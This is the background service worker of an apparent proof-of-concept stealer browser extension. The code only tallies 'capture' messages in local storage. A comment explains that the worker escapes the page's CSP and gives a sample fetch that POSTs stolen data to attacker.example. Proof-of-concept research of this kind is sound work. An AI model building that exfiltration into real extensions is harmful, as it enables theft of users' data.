// background.js — service worker (ISOLATED, extension privileges).
//
// A real stealer would exfiltrate here: the background worker is outside the
// page, so the page's `connect-src 'self'` CSP does not apply to it — a
// `fetch("https://attacker.example/collect", {method:"POST", body: stolen})`
// would succeed. This PoC performs NO network calls. It only tallies captures
// locally so we can confirm the content scripts are wired up.
chrome.runtime.onMessage.addListener((msg) => {
  if (msg && msg.type === "capture") {
    chrome.storage.local.get({ count: 0 }, ({ count }) => {
      chrome.storage.local.set({ count: count + 1 });
    });
  }
});
